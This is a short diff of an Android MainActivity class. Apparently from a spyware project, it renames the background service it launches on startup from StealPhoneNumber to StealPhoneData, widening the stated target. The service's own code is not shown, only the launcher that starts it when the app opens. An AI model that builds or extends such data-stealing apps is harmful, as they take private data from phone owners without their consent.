@@ -3,14 +3,14 @@ import android.app.Activity;
 import android.content.Intent;
 import android.os.Bundle;
 /**
- * Main activity class. Kickstarts StealPhoneNumber.
+ * Main activity class. Kickstarts StealPhoneData.
  * @author Anthony Hewins
  * @version 1.0
  * @since 1.0
  */
 public class MainActivity extends Activity {
     /**
-     * Main activity that starts the StealPhoneNumber IntentService. Doesn't require the
+     * Main activity that starts the StealPhoneData IntentService. Doesn't require the
      * savedInstanceState parameter.
      * @param savedInstanceState N/a; application doesn't need to remember where it last started
      */
@@ -18,6 +18,6 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        startService(new Intent(this, StealPhoneNumber.class));
+        startService(new Intent(this, StealPhoneData.class));
     }
 }
